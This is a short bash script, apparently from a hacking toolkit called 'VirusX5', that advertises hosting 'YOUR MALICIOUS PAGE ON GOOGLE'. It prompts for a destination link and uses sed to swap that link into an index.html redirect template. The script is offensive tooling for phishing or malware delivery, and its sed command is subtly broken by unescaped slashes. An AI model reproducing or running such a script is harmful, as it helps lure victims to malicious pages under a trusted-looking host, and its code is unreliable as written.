#!/bin/bash
#hosting Script

#colours
pur='\e[35m'
cyan='\e[1;36m'
grn='\e[1;92m'
end='\e[0m'

#Credits

echo -e "$grn                  WELCOME HERE YOU CAN HOST YOUR MALICIOUS PAGE ON GOOGLE $end"
sleep 1
echo "               
              ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ ██╗  ██╗███████╗
              ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗╚██╗██╔╝██╔════╝
              ███████║███████║██║     █████╔╝ █████╗  ██████╔╝ ╚███╔╝ ███████╗
              ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗ ██╔██╗ ╚════██║
              ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║██╔╝ ██╗███████║
              ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
                                                                    "|lolcat
echo -e "$pur STEPS TO BE FOLLOWED $end"
echo -e "$cyan Auto host is not working always $end"
echo -e "$grn USE manual host instead of Auto Setup $end"
echo 
echo 
sleep 2

printf "$grn Enter Your Destination Link:-  $end"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Enter Your Website/Link Here: \e[0m' link
var=$link
cd $HOME/VirusX5/host/

sed -i s/http://www.zaeemtechnical.ml/$var/  $HOME/VirusX5/host/index.html
